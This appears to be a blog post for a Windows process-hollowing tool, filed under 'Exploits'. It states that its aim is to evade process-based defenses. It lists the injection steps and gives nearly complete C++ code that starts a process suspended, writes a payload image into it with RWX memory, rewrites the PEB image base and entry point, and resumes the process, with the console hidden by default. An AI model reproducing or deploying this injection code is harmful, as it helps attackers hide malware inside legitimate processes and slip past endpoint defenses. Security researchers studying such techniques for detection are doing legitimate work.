---
layout: post
title:  "ProcessHollowing"
author: Aaron Ti
date:   2020-08-06
category: Exploits
abstract: Injection of code into suspended and hollowed processes in order to evade process-based defenses
website: https://github.com/mcdulltii/ProcessHollowing
---

## Building

```
> cmake .
```

To show(1)/hide(2) console window when running executable:

```
- Properties
  - Linker
    - System
      - SubSystem: 
	1. Console (/SUBSYSTEM:CONSOLE)
	2. Windows (/SUBSYSTEM:WINDOWS)
    - Advanced
      - Entry Point
	1. (BLANK)
	2. mainCRTStartup
```

Default: hidden

## Methodology

1. Create and suspend target process
2. Get thread context of target process
3. Get image base of target process
4. Unmap target process memory space (Optional)
5. Allocate temporary memory space for custom payload
6. Change image base for symbolic imports
7. Store payload in allocated temporary memory space
8. Ensure image base of process is the same
9. Overwrite target process memory space with payload
10. Free allocated temporary memory space
11. Overwrite image base in headers
12. Set new Entrypoint
13. Resume target process

```Cpp
/*
runPE32:
    targetPath - application where we want to inject
    payload - buffer with raw image of PE that we want to inject
    payload_size - size of the above

    desiredBase - address where we want to map the payload in the target memory; NULL if we don't care. 
        This address will be ignored if the payload has no relocations table, because then it must be mapped to it's original ImageBase.
    unmap_target - do we want to unmap the target? (we are not forced to do it if it doesn't disturb our chosen base)
*/
bool runPE32(LPWSTR targetPath, BYTE* payload, SIZE_T payload_size, ULONGLONG desiredBase = NULL, bool unmap_target = false)
{
    load_ntdll_functions();

    //Load payload:
    IMAGE_NT_HEADERS32* payload_nt_hdr32 = get_nt_hrds32(payload);
    const ULONGLONG oldImageBase = payload_nt_hdr32->OptionalHeader.ImageBase;
    SIZE_T payloadImageSize = payload_nt_hdr32->OptionalHeader.SizeOfImage;

    //create target process:
    create_new_process1(targetPath, pi);

    //get initial context of the target:
    memset(&context, 0, sizeof(WOW64_CONTEXT));
    context.ContextFlags = CONTEXT_INTEGER;
    Wow64GetThreadContext(pi.hThread, &context);

    //get image base of the target:
    DWORD PEB_addr = context.Ebx;
    ReadProcessMemory(pi.hProcess, LPVOID(PEB_addr + 8), &targetImageBase, sizeof(DWORD), NULL);

    //try to allocate space that will be the most suitable for the payload:
    LPVOID remoteAddress = VirtualAllocEx(pi.hProcess, (LPVOID)desiredBase, payloadImageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    //change the image base saved in headers - this is very important for loading imports:
    payload_nt_hdr32->OptionalHeader.ImageBase = static_cast<DWORD>((ULONGLONG)remoteAddress);

    //Prepare the payload image in the local memory, then copy it into the space reserved in the target process
    LPVOID localCopyAddress = VirtualAlloc(NULL, payloadImageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    copy_pe_to_virtual_l(payload, payload_size, localCopyAddress);

    //if the base address of the payload changed, we need to apply relocations:
    if ((ULONGLONG)remoteAddress != oldImageBase) {
        apply_relocations((ULONGLONG)remoteAddress, oldImageBase, localCopyAddress);
    }

    SIZE_T written = 0;
    // paste the local copy of the prepared image into the reserved space inside the remote process:
    WriteProcessMemory(pi.hProcess, remoteAddress, localCopyAddress, payloadImageSize, &written);

    //free the localy allocated copy
    VirtualFree(localCopyAddress, payloadImageSize, MEM_FREE);

    //overwrite ImageBase stored in PEB
    DWORD remoteAddr32b = static_cast<DWORD>((ULONGLONG)remoteAddress);
    WriteProcessMemory(pi.hProcess, LPVOID(PEB_addr + 8), &remoteAddr32b, sizeof(DWORD), &written);

    //overwrite context: set new Entry Point
    DWORD newEP = static_cast<DWORD>((ULONGLONG)remoteAddress + payload_nt_hdr32->OptionalHeader.AddressOfEntryPoint);
    context.Eax = newEP;
    Wow64SetThreadContext(pi.hThread, &context);

    //start the injected:
    printf("--\n");
    ResumeThread(pi.hThread);
    return true;
}
```

## Reference

- https://github.com/hasherezade/demos/tree/master/run_pe
